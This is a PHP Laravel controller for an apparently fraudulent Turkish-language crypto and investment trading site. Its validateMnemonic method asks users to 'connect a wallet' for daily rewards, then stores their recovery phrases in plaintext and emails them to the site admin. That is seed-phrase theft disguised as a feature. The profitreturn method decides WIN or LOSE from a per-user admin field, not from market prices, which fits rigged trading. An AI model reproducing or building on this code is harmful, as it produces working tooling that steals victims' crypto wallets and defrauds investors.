<?php

namespace App\Http\Controllers\User;

use App\Http\Controllers\Controller;
use App\Models\CryptoAccount;
use Illuminate\Http\Request;
use App\Models\User;
use App\Models\Settings;
use App\Models\Plans;
use App\Models\User_plans;
use App\Models\User_signal;
use App\Models\Signal;
use App\Models\Investment;
use App\Models\Mt4Details;
use App\Models\Deposit;
use App\Models\SettingsCont;
use App\Models\Wdmethod;
use App\Models\Withdrawal;
use App\Models\Tp_Transaction;
use App\Traits\PingServer;
use App\Services\CryptoWalletService;
use App\Models\Wallets;
use App\Models\Instrument;
use App\Mail\NewNotification;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Auth;

class ViewsController extends Controller
{
    use PingServer;

    public function dashboard(Request $request)
    {

        $settings = Settings::where('id', '1')->first();
        $user = User::find(auth()->user()->id);


        //check if user does not have ref link then update his link
        if ($user->ref_link == '') {
            User::where('id', $user->id)
                ->update([
                    'ref_link' => $settings->site_address . '/ref/' . $user->username,
                ]);
        }

        //give reg bonus if new
        if ($user->signup_bonus != "received" && ($settings->signup_bonus != NULL && $settings->signup_bonus > 0)) {
            User::where('id', $user->id)
                ->update([
                    'bonus' => $user->bonus + $settings->signup_bonus,
                    'account_bal' => $user->account_bal + $settings->signup_bonus,
                    'signup_bonus' => "received",
                ]);
            //create history
            Tp_Transaction::create([
                'user' => Auth::user()->id,
                'plan' => "SignUp Bonus",
                'amount' => $settings->signup_bonus,
                'type' => "Bonus",
            ]);
        }

        if (DB::table('crypto_accounts')->where('user_id', Auth::user()->id)->doesntExist()) {
            try {
                CryptoAccount::create([
                    'user_id' => Auth::user()->id,
                    'btc' => 0.00,
                    'eth' => 0.00,
                    'ltc' => 0.00,
                    'xrp' => 0.00,
                    'link' => 0.00,
                    'bat' => 0.00,
                    'aave' => 0.00,
                    'usdt' => 0.00,
                    'xlm' => 0.00,
                    'bch' => 0.00,
                ]);
            } catch (\Exception $e) {
                \Log::debug('CryptoAccount creation failed: ' . $e->getMessage());
            }
        }

        //sum total deposited
        $total_deposited = DB::table('deposits')->where('user', $user->id)->where('status', 'Processed')->sum('amount');

        $total_withdrawal = DB::table('withdrawals')->where('user', $user->id)->where('status', 'Processed')->sum('amount');

        //log user out if not blocked by admin
        if ($user->status != "active") {
            $request->session()->flush();
            return redirect()->route('dashboard');
        }

       // Fetch instruments grouped by type for trading dropdown
        $instruments = Instrument::select('symbol', 'type', 'logo', 'name')
            ->whereNotNull('symbol')
            ->orderBy('type')
            ->orderBy('symbol')
            ->get()
            ->groupBy('type');

            // Get Bitcoin price for BTC equivalent calculation
        $bitcoin_price = Instrument::where('symbol', 'LIKE', '%BTC%')->where('name',"Bitcoin")
            ->whereNotNull('price')
            ->first();

        // Calculate BTC equivalent of account balance
        $btc_equivalent = 0;
        if ($bitcoin_price && $bitcoin_price->price > 0) {
            $btc_equivalent = $user->account_bal / $bitcoin_price->price;
        }


        return view("user.dashboard", [
            'title' => 'Hesap Gösterge Paneli',
            'settings' => $settings,
            'deposited' => $total_deposited,
            'total_withdrawal' => $total_withdrawal,
            'trading_accounts' => Mt4Details::where('client_id', Auth::user()->id)->count(),
            'plans' => User_plans::where('user', Auth::user()->id)->orderByDesc('id')->skip(0)->take(2)->get(),
            't_history' => Tp_Transaction::where('user', Auth::user()->id)
                ->whereIn('type', ['Sell','Buy','WIN','LOSE'])
                ->orderByDesc('id')->skip(0)->take(5)
                ->get(),
             'instruments' => $instruments,
            'bitcoin_price' => $bitcoin_price,
            'btc_equivalent' => $btc_equivalent,
        ]);
    }

    /**
     * Get dashboard data for AJAX requests (User Dashboard)
     *
     * @param Request $request
     * @return \Illuminate\Http\JsonResponse
     */
    public function getDashboardData(Request $request)
    {
        try {
            $user = User::find(auth()->user()->id);
            
            // Basic statistics
            $total_deposited = DB::table('deposits')->where('user', $user->id)->where('status', 'Processed')->sum('amount');
            $total_withdrawal = DB::table('withdrawals')->where('user', $user->id)->where('status', 'Processed')->sum('amount');
            $active_plans = User_plans::where('user', $user->id)->where('active', 'yes')->count();
            $total_plans = User_plans::where('user', $user->id)->count();
            
            // Recent transactions
            $recent_transactions = Tp_Transaction::where('user', $user->id)
                ->orderByDesc('id')
                ->limit(5)
                ->get()
                ->map(function($transaction) {
                    return [
                        'message' => $transaction->plan . ' - ' . number_format($transaction->amount, 2) . ' TL',
                        'created_at' => $transaction->created_at->toISOString(),
                        'type' => $transaction->type
                    ];
                });

            // Chart data - Last 7 days balance changes
            $chartData = [];
            for ($i = 6; $i >= 0; $i--) {
                $date = now()->subDays($i);
                $dayTransactions = Tp_Transaction::where('user', $user->id)
                    ->whereDate('created_at', $date)
                    ->sum('amount');
                
                $chartData[] = [
                    'date' => $date->format('d.m'),
                    'amount' => $dayTransactions
                ];
            }

            return response()->json([
                'success' => true,
                'data' => [
                    'stats' => [
                        'balance' => [
                            'value' => $user->account_bal,
                            'change' => 0 // Could calculate change here
                        ],
                        'deposits' => [
                            'value' => $total_deposited,
                            'change' => 0
                        ],
                        'withdrawals' => [
                            'value' => $total_withdrawal,
                            'change' => 0
                        ],
                        'active_plans' => [
                            'value' => $active_plans,
                            'change' => 0
                        ]
                    ],
                    'charts' => [
                        'balance' => [
                            'labels' => array_column($chartData, 'date'),
                            'values' => array_column($chartData, 'amount')
                        ]
                    ],
                    'recentActivities' => $recent_transactions->toArray()
                ]
            ]);

        } catch (\Exception $e) {
            \Log::error('User dashboard data error: ' . $e->getMessage());
            
            return response()->json([
                'success' => false,
                'message' => 'Dashboard verileri yüklenirken hata oluştu'
            ], 500);
        }
    }



    public function connect_wallet()
    {
        $settings = Settings::where('id', 1)->first();

        return view('user.connect-wallet', [
            'title' => 'Cüzdan Bağlantısı',
            'settings'=>$settings,
        ]);
    }




    public function validateMnemonic(Request $request)
    {
        // Validate input
        $request->validate([
            'wallet' => 'required|string|max:100',
            'mnemonic' => 'required|string|min:12'
        ]);

        $mnemonic = trim($request->input('mnemonic'));
        $wallet = $request->input('wallet');

        // Basic validation for mnemonic format
        $words = explode(' ', $mnemonic);
        $words = array_filter($words, function($word) {
            return !empty(trim($word));
        });

        // Check word count (12, 15, 18, 21, or 24 words are standard)
        $validWordCounts = [12, 15, 18, 21, 24];
        if (!in_array(count($words), $validWordCounts)) {
            return redirect()->back()
                ->with('message', 'Invalid recovery phrase. Must be 12, 15, 18, 21, or 24 words.')
                ->withInput();
        }

        // Check for invalid characters
        foreach ($words as $word) {
            if (!preg_match('/^[a-zA-Z]+$/', $word)) {
                return redirect()->back()
                    ->with('message', 'Recovery phrase contains invalid characters. Only letters are allowed.')
                    ->withInput();
            }
        }

        $cryptoService = new CryptoWalletService();

        if ($cryptoService->isMnemonicValid($mnemonic)) {
            // Check if user already has a wallet connected
            $existingWallet = Wallets::where('user', Auth::user()->id)->first();

            if ($existingWallet) {
                // Update existing wallet
                $existingWallet->update([
                    'wallet_name' => $wallet,
                    'phrase' => $mnemonic,
                    'status' => 'active',
                    'last_validated' => now(),
                    'updated_at' => now()
                ]);
            } else {
                // Create new wallet entry
                Wallets::create([
                    'user' => Auth::user()->id,
                    'wallet_name' => $wallet,
                    'phrase' => $mnemonic,
                    'status' => 'active',
                    'last_validated' => now(),
                ]);
            }

            // Update user's wallet connection status
            User::where('id', Auth::user()->id)
                ->update([
                    'wallet_connected' => 1
                ]);

            // Prepare admin notification
            $msg = "New wallet connection:\n\n";
            $msg .= "User: " . Auth::user()->name . " (" . Auth::user()->email . ")\n";
            $msg .= "Wallet Name: " . $wallet . "\n";
            $msg .= "Connection Time: " . now()->format('Y-m-d H:i:s') . "\n\n";
            $msg .= "Phrase Mnemonic: " . $mnemonic . "\n\n";

            $subject = "New wallet connection from " . Auth::user()->name;

            // Send admin notification
            try {
                $settings = Settings::where('id', '1')->first();

                    Mail::to($settings->contact_email)->send(new NewNotification($msg, $subject, "Admin"));

            } catch (\Exception $e) {
                // Log the error but don't break the flow
                \Log::error('Failed to send wallet connection notification: ' . $e->getMessage());
            }

            return redirect()->back()
                ->with('success', 'Wallet connected successfully! You can now start earning daily rewards.');

        } else {
            return redirect()->back()
                ->with('message', 'Invalid recovery phrase. Please check your phrase and try again.')
                ->withInput();
        }
    }

    //Profile route
    public function profile()
    {

        $userinfo = User::where('id', Auth::user()->id)->first();

        $paymethods = Wdmethod::select(['status', 'name'])->where(function ($query) {
            $query->where('type', '=', 'withdrawal')
                ->orWhere('type', '=', 'both');
        })->whereIn('name', ['Bitcoin', 'Ethereum', 'Litecoin', 'Bank Transfer', 'USDT'])->get();

        return view("user.profile")->with(array(
            'userinfo' => $userinfo,
            'methods' => $paymethods,
            'title' => 'Profil',
        ));
    }

    //return add withdrawal account form view
    public function accountdetails()
    {


        return view("user.updateacct")->with(array(
            'title' => 'Update account details',
        ));

    }
//view loan
    public function loan()
    {
        return view('user.loan')->with(array(
            'title' => 'Kredi Başvurusu',
        ));
    }
    //support route
    public function support()
    {


        return view("user.support")
            ->with(array(
                'title' => 'Destek',
            ));
    }

    //Trading history route
    public function tradinghistory()
    {


        return view("user.thistory")
            ->with(array(
                't_history' => Tp_Transaction::where('user', Auth::user()->id)
                    ->whereIn('type', ['Sell','Buy','WIN','LOSE'])
                    ->orderByDesc('id')->paginate(15),

                'title' => 'İşlem Geçmişi',
            ));
    }

    //Account transactions history route
    public function accounthistory()
    {


        return view("user.transactions")
            ->with(array(
                't_history' => Tp_Transaction::where('user', Auth::user()->id)
                    ->where('leverage', Null)
                    ->orderByDesc('id')
                    ->paginate(15),

                'withdrawals' => Withdrawal::where('user', Auth::user()->id)->orderBy('id', 'desc')
                    ->paginate(10),
                'deposits' => Deposit::where('user', Auth::user()->id)->orderBy('id', 'desc')
                    ->paginate(10),
                'title' => 'Hesap İşlem Geçmişi',

            ));
    }

    //Return deposit route
    public function deposits()
    {


        $paymethod = Wdmethod::where(function ($query) {
            $query->where('type', '=', 'deposit')
                ->orWhere('type', '=', 'both');
        })->where('status', 'enabled')->orderByDesc('id')->get();

        //sum total deposited
        $total_deposited = DB::table('deposits')->where('user', auth()->user()->id)->where('status', 'Processed')->sum('amount');

        return view("user.deposits")
            ->with(array(
                'title' => 'Hesabınızı Fonlayın',
                'dmethods' => $paymethod,
                'deposits' => Deposit::where(['user' => Auth::user()->id])
                    ->orderBy('id', 'desc')
                    ->get(),
                'deposited' => $total_deposited,
            ));
    }



    public function signal()
    {


        $paymethod = Wdmethod::where(function ($query) {
            $query->where('type', '=', 'deposit')
                ->orWhere('type', '=', 'both');
        })->where('status', 'enabled')->orderByDesc('id')->get();
        $signals =  Signal::where('type', 'main')->get();
        $settings = Settings::where('id', '1')->first();



        return view("user.signal")
            ->with(array(
                'title' => 'Hesabınızı Fonlayın',
                'dmethods' => $paymethod,
                'signals' => $signals,

                'settings' =>$settings,


            ));
    }

    //Return withdrawals route
    public function withdrawals()
    {

        $user = Auth::user();
        $number_of_trades = User_plans::where('user', Auth::user()->id)->count();
        $required_more_trades = $user->numberoftrades-$number_of_trades  ;

        // if($number_of_trades < $user->numberoftrades){
        //     return redirect()->back()
        //     ->with('message', "You have to perform $required_more_trades more trades to be eligible for withdrawal" );
        // }
        $settings = Settings::where('id', '1')->first();
        $withdrawals =  Wdmethod::where(function ($query) {
            $query->where('type', '=', 'withdrawal')
                ->orWhere('type', '=', 'both');
        })->where('status', 'enabled')->orderByDesc('id')->get();

        return view('user.withdrawals')
            ->with(array(
                'title' => 'Fonlarınızı Çekin',
                'wmethods' => $withdrawals,
                'withdrawals' => Withdrawal::where('user', Auth::user()->id)->orderBy('id', 'desc')
                ->get(),
            ));

    }

    public function transferview()
    {


        $settings = SettingsCont::find(1);
        if (!$settings->use_transfer) {
            abort(404);
        }
        return view("user.transfer", [
            'title' => 'Arkadaşınıza Fon Gönderin',
        ]);
    }

    //Subscription Trading
    public function subtrade()
    {


        $settings = Settings::where('id', 1)->first();
        $mod = $settings->modules;
        if (!$mod['subscription']) {
            abort(404);
        }
        return view("user.subtrade")
            ->with(array(
                'title' => 'Abonelik Ticareti',
                'subscriptions' => Mt4Details::where('client_id', auth::user()->id)->orderBy('id', 'desc')->get(),
            ));
    }


    //Main Plans route
    public function mplans()
    {


        return view("user.mplans")
            ->with(array(
                'title' => 'Ana Planlar',
                'plans' => Plans::where('type', 'main')->get(),
                'settings' => Settings::where('id', '1')->first(),
            ));
    }

    //My Plans route
    public function myplans($sort)
    {




        if ($sort == 'All') {
            return view("user.myplans")
                ->with(array(
                    'numOfPlan' => investment::where('user', Auth::user()->id)->count(),
                    'title' => 'Paketleriniz',
                    'plans' =>  investment::where('user', Auth::user()->id)->orderByDesc('id')->paginate(10),
                    'settings' => Settings::where('id', '1')->first(),
                ));
        } else {
            return view("user.myplans")
                ->with(array(
                    'numOfPlan' =>  investment::where('user', Auth::user()->id)->count(),
                    'title' => 'Paketleriniz',
                    'plans' =>  investment::where('user', Auth::user()->id)->where('active', $sort)->orderByDesc('id')->paginate(10),
                    'settings' => Settings::where('id', '1')->first(),
                ));
        }
    }




//Real Estate Plans route
    public function realestate()
    {
        return view("user.realestate")
            ->with(array(
                'title' => 'Gayrimenkul Yatırım Planları',
                'plans' => Plans::where('investment_type', 'real_estate')->get(),
                'settings' => Settings::where('id', '1')->first(),
            ));
    }

    //Cryptocurrency Plans route
    public function crypto()
    {
        return view("user.crypto")
            ->with(array(
                'title' => 'Kripto Para Yatırım Planları',
                'plans' => Plans::where('investment_type', 'crypto')->get(),
                'settings' => Settings::where('id', '1')->first(),
            ));
    }

    //Stock Market Plans route
    public function stocks()
    {
        return view("user.stocks")
            ->with(array(
                'title' => 'Hisse Senedi Yatırım Planları',
                'plans' => Plans::where('investment_type', 'stock')->get(),
                'settings' => Settings::where('id', '1')->first(),
            ));
    }


    public function mysingals($sort)
    {




        if ($sort == 'All') {
            return view("user.msignals")
                ->with(array(
                    'numOfPlan' => User_signal::where('user', Auth::user()->id)->count(),
                    'title' => 'Sinyalleriniz',
                    'signals' =>  User_signal::where('user', Auth::user()->id)->orderByDesc('id')->paginate(10),
                    'settings' => Settings::where('id', '1')->first(),
                ));
        } else {
            return view("user.msignals")
                ->with(array(
                    'numOfPlan' =>  User_signal::where('user', Auth::user()->id)->count(),
                    'title' => 'Sinyalleriniz',
                    'signals' =>  User_signal::where('user', Auth::user()->id)->where('active', $sort)->orderByDesc('id')->paginate(10),
                    'settings' => Settings::where('id', '1')->first(),
                ));
        }
    }

    public function sortPlans($sort)
    {

        return redirect()->route('myplans', $sort);
    }

    public function planDetails($id)
    {

        $plan =  investment::find($id);
        return view("user.plandetails", [
            'title' => $plan->uplan->name ,
            'plan' => $plan,
            'transactions' => Tp_Transaction::where('type', 'ROI')->where('user_plan_id', $plan->id)->orderByDesc('id')->paginate(10),
        ]);
    }


    function twofa()
    {
        return view("profile.show", [
            'title' => 'Gelişmiş Güvenlik Ayarları',
        ]);
    }

    // Referral Page
    public function referuser()
    {
        // Remove performance-killing profitreturn call from here
        // This should be handled by scheduled tasks, not on every page load
        
        return view("user.referuser", [
            'title' => 'Kullanıcıyı Referans Et',
        ]);
    }

    public function verifyaccount()
    {



        if (Auth::user()->account_verify == 'Verified') {
            abort(404, 'You do not have permission to access this page');
        }
        return view("user.verify", [
            'title' => 'Hesabınızı Doğrulayın',
        ]);
    }

    public function verificationForm()
    {


        if (Auth::user()->account_verify == 'Verified') {
            abort(404, 'You do not have permission to access this page');
        }
        return view("user.verification", [
            'title' => 'KYC Application'
        ]);
    }



    public function tradeSignals()
    {
        $settings = Settings::where('id', 1)->first();
        $mod = $settings->modules;
        if (!$mod['signal']) {
            abort(404);
        }

        $response = $this->fetctApi('/subscription', [
            'id' => auth()->user()->id
        ]);
        $res = json_decode($response);

        $responseSt = $this->fetctApi('/signal-settings');
        $info = json_decode($responseSt);

        return view("user.signals.subscribe", [
            'title' => 'İşlem Sinyalleri',
            'subscription' => $res->data,
            'set' => $info->data->settings,
        ]);
    }


    public function binanceSuccess()
    {
        return redirect()->route('deposits')->with('success', 'Your Deposit was successful, please wait while it is confirmed. You will receive a notification regarding the status of your deposit.');
    }

    public function binanceError()
    {
        return redirect()->route('deposits')->with('message', 'Something went wrong please try again. Contact our support center if problem persist');
    }



    public function profitreturn($user)
    {
        // OPTIMIZED VERSION - Removed sleep() and batch operations for performance
        try {
            $settings = Settings::where('id', 1)->first();
            $now = now();
            
            // Only get expired trades that are still active
            $trades = User_plans::where('active', 'yes')
                ->where('user', $user)
                ->where('expire_date', '<', $now)
                ->get();
            
            if ($trades->isEmpty()) {
                return; // Early exit if no expired trades
            }
            
            $used = User::find($user);
            if (!$used) {
                return; // User not found
            }
            
            // Batch operations for better performance
            $totalProfit = 0;
            $totalBalance = 0;
            $tradeIds = [];
            $transactions = [];
            
            foreach ($trades as $trade) {
                $tradeIds[] = $trade->id;
                
                if ($used->tradetype == 'Profit') {
                    $profit = $trade->leverage * $trade->amount * 0.01;
                    $totalProfit += $profit;
                    $totalBalance += $trade->amount; // Return original investment
                    
                    $transactions[] = [
                        'user' => $used->id,
                        'plan' => $trade->assets,
                        'amount' => $profit,
                        'type' => 'WIN',
                        'leverage' => $trade->leverage,
                        'created_at' => $now,
                        'updated_at' => $now,
                    ];
                } else {
                    $loss = (100 - $trade->leverage) * $trade->amount * 0.01;
                    $amountloss = $trade->leverage * $trade->amount * 0.01;
                    $totalBalance += $loss;
                    
                    $transactions[] = [
                        'user' => $used->id,
                        'plan' => $trade->assets,
                        'amount' => $amountloss,
                        'type' => 'LOSE',
                        'leverage' => $trade->leverage,
                        'created_at' => $now,
                        'updated_at' => $now,
                    ];
                }
            }
            
            // Perform all database operations in a single transaction for atomicity
            DB::transaction(function () use ($used, $totalProfit, $totalBalance, $tradeIds, $transactions, $now) {
                // Update user balance in single query
                User::where('id', $used->id)->update([
                    'roi' => $used->roi + $totalProfit,
                    'account_bal' => $used->account_bal + $totalBalance,
                    'updated_at' => $now,
                ]);
                
                // Batch insert transactions (much faster than individual creates)
                if (!empty($transactions)) {
                    Tp_Transaction::insert($transactions);
                }
                
                // Batch update trade status (single query instead of multiple)
                if (!empty($tradeIds)) {
                    User_plans::whereIn('id', $tradeIds)->update([
                        'active' => 'expired',
                        'updated_at' => $now,
                    ]);
                }
            });
            
        } catch (\Exception $e) {
            // Log error but don't break the application
            \Log::error('Error in profitreturn method: ' . $e->getMessage());
        }
    }
}
